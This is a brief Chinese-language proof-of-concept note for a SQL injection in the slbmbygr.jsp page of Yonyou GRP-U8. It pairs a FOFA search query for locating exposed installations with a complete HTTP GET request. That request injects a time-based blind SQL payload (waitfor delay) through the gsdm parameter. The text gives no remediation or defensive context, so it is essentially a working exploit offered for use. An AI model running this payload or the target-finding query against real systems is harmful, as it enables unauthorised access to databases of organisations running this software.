## 用友GRP-U8-slbmbygr.jsp存在SQL注入漏洞

## fofa
```
app="用友-GRP-U8"
```

## poc
```
GET /u8qx/slbmbygr.jsp?gsdm=1';waitfor+delay+'0:0:3'--&zydm=&kjnd= HTTP/1.1
Host: xxxxxx
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
